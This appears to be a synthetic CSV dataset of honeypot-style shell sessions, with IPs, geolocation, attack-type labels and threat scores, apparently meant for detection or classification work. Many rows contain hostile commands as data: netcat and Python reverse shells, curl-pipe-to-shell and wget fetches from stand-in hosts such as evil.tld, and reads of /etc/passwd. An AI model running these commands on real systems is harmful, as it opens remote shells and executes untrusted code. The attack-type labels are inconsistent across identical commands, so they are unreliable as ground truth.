session_id,src_ip,timestamp,username,command,failed_logins,commands_count,has_url,payload_hash,geo_lat,geo_lon,country,attack_type,threat_score
sess_10997,46.175.93.25,2025-10-03T12:16:35.746466Z,pi,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",6,3,0,,37.448213,126.649968,KR,reverse_shell,0.24
sess_11000,138.93.111.250,2025-10-03T12:25:53.746466Z,admin,echo 'hello' > /tmp/x; cat /tmp/x,2,2,0,,38.230506,-122.80641,US,benign,0.11
sess_10999,146.6.2.84,2025-10-03T12:36:40.746466Z,guest,chmod +x /tmp/h; /tmp/h &,5,2,0,,-23.943628,-46.469522,BR,payload_exec,0.185
sess_10998,176.41.173.116,2025-10-03T14:16:54.746466Z,admin,grep -R 'password' /var/log || true,2,1,0,,39.418788,115.809475,CN,benign,0.08
sess_10978,181.128.182.22,2025-10-03T15:22:43.746466Z,admin,cat /etc/passwd | grep root; ps aux | grep sshd,0,2,0,,40.241306,116.657635,CN,benign,0.06
sess_10985,103.81.86.83,2025-10-03T15:22:45.746466Z,admin,nc -e /bin/sh 10.10.10.5 4444,2,1,0,,52.828125,13.450905,DE,payload_exec,0.08
sess_10977,181.253.221.108,2025-10-03T15:23:06.746466Z,www-data,nc -e /bin/sh 10.10.10.5 4444,2,1,0,,37.734819,126.772596,KR,payload_exec,0.08
sess_10956,101.184.158.215,2025-10-03T15:23:10.746466Z,oracle,cat /etc/passwd | grep root; python3 -c 'print(2+2)',4,2,0,,35.10852,140.248781,JP,benign,0.16
sess_10972,93.69.153.1,2025-10-03T15:23:15.746466Z,guest,cat /etc/passwd | grep root; python3 -c 'print(2+2)',3,2,0,,55.324164,37.594419,RU,recon,0.135
sess_10944,49.153.102.144,2025-10-03T15:23:22.746466Z,postgres,chmod +x /tmp/h; /tmp/h &,3,2,0,,48.893833,2.101903,FR,payload_exec,0.135
sess_10955,117.97.107.253,2025-10-03T15:23:23.746466Z,unknown,whoami; pwd; ls -la; ls -la; id; uname -a,3,6,0,,52.40037,13.833992,DE,recon,0.255
sess_10986,112.38.101.24,2025-10-03T15:23:23.746466Z,unknown,find / -maxdepth 2 -type f | head -n 20; cat /etc/passwd | grep root,0,2,0,,35.551788,140.105711,JP,benign,0.06
sess_10963,194.206.144.228,2025-10-03T15:23:30.746466Z,ubuntu,curl -s http://evil.tld/payload.sh | sh,2,1,1,sha256:a581d7577d2f241dd9443ba6d79385b2618b8c2ae91748f9971db51aa0a2a90b,28.815928,77.2329,IN,payload_exec,0.58
sess_10937,148.93.99.200,2025-10-03T15:23:32.746466Z,unknown,nc -e /bin/sh 10.10.10.5 4444,0,1,0,,37.532751,127.199696,KR,payload_exec,0.03
sess_10979,154.192.195.11,2025-10-03T15:23:32.746466Z,user,echo 'hello' > /tmp/x; cat /tmp/x,0,2,0,,-23.343369,-46.148752,BR,benign,0.06
sess_10933,213.37.100.123,2025-10-03T15:23:36.746466Z,postgres,curl -s http://evil.tld/payload.sh | sh,6,1,1,sha256:70588b9ad086e1294b98c62e6ae3c135f63ab3b5225b70678ac2e584b541f8c1,28.697095,77.307056,IN,malware_fetch,0.68
sess_10946,77.130.11.36,2025-10-03T15:23:38.746466Z,www-data,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",3,3,0,,35.161844,140.279272,JP,reverse_shell,0.165
sess_10995,12.27.183.151,2025-10-03T15:23:38.746466Z,unknown,echo 'hello' > /tmp/x; cat /tmp/x,0,2,0,,52.641831,13.715585,DE,benign,0.06
sess_10951,62.181.78.49,2025-10-03T15:23:52.746466Z,ubuntu,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,1,3,1,sha256:1114ade9a9dab55ecbb023b0932e9bbe827a704cbf04bb2e06d31cf3261117b7,51.060188,-0.309576,GB,malware_fetch,0.615
sess_10938,167.107.79.83,2025-10-03T15:23:57.746466Z,ubuntu,find / -maxdepth 2 -type f | head -n 20,5,1,0,,40.481585,116.591589,CN,benign,0.155
sess_10973,52.124.200.202,2025-10-03T15:23:58.746466Z,www-data,chmod +x /tmp/h; /tmp/h &,0,2,0,,28.285466,77.74786,IN,malware_fetch,0.06
sess_10954,208.194.63.24,2025-10-03T15:24:06.746466Z,ftp,cat /etc/passwd | grep root,2,1,0,,48.686668,2.946629,FR,benign,0.08
sess_10949,200.77.169.19,2025-10-03T15:24:10.746466Z,www-data,echo 'hello' > /tmp/x; cat /tmp/x; python3 -c 'print(2+2)',0,3,0,,-23.460815,-47.225675,BR,benign,0.09
sess_10971,203.77.217.220,2025-10-03T15:24:20.746466Z,guest,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",0,3,0,,51.412917,-0.155945,GB,reverse_shell,0.09
sess_10959,39.83.15.128,2025-10-03T15:24:21.746466Z,guest,nc -e /bin/sh 10.10.10.5 4444,7,1,0,,-24.119504,-47.199104,BR,reverse_shell,0.205
sess_10988,73.115.225.166,2025-10-03T15:24:27.746466Z,test,curl -s http://evil.tld/payload.sh | sh,4,1,1,sha256:ca3c1609a28bd7898eeb5258c1353daecbebab696d17eb8a7a3477eabeb6cd2a,39.971787,117.005447,CN,malware_fetch,0.63
sess_10950,223.199.9.3,2025-10-03T15:24:32.746466Z,pi,nc -e /bin/sh 10.10.10.5 4444,1,1,0,,37.813737,-122.235065,US,malware_fetch,0.055
sess_10987,199.150.42.83,2025-10-03T15:24:32.746466Z,postgres,echo 'hello' > /tmp/x; cat /tmp/x,1,2,0,,37.966398,127.557915,KR,benign,0.085
sess_10952,28.167.161.238,2025-10-03T15:24:34.746466Z,www-data,nc -e /bin/sh 10.10.10.5 4444,1,1,0,,56.279363,37.277983,RU,malware_fetch,0.055
sess_10990,78.220.189.94,2025-10-03T15:24:37.746466Z,pi,grep -R 'password' /var/log || true,6,1,0,,37.471174,-122.373469,US,benign,0.18
sess_10957,197.165.23.37,2025-10-03T15:24:44.746466Z,test,echo 'hello' > /tmp/x; cat /tmp/x,0,2,0,,37.681945,126.629791,KR,benign,0.06
sess_10939,212.213.137.59,2025-10-03T15:24:51.746466Z,postgres,whoami; pwd; ls -la; whoami; pwd; ls -la,0,6,0,,-23.78088,-46.557356,BR,benign,0.18
sess_10966,114.231.109.117,2025-10-03T15:24:51.746466Z,ftp,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,2,3,0,,35.49432,140.287723,JP,reverse_shell,0.14
sess_10932,198.32.67.134,2025-10-03T15:25:12.746466Z,root,curl -s http://evil.tld/payload.sh | sh,3,1,1,sha256:a6274723785457cc0192fc52fe0bf64e27624526fcd0b8a16e0d77da7ad9f897,56.213769,37.078599,RU,payload_exec,0.605
sess_10945,16.71.34.223,2025-10-03T15:25:17.746466Z,pi,python3 -c 'print(2+2)'; cat /etc/passwd | grep root,0,2,0,,52.158782,13.970726,DE,benign,0.06
sess_10991,43.49.243.138,2025-10-03T15:25:17.746466Z,admin,python3 -c 'print(2+2)',1,1,0,,52.089493,-0.169456,GB,benign,0.055
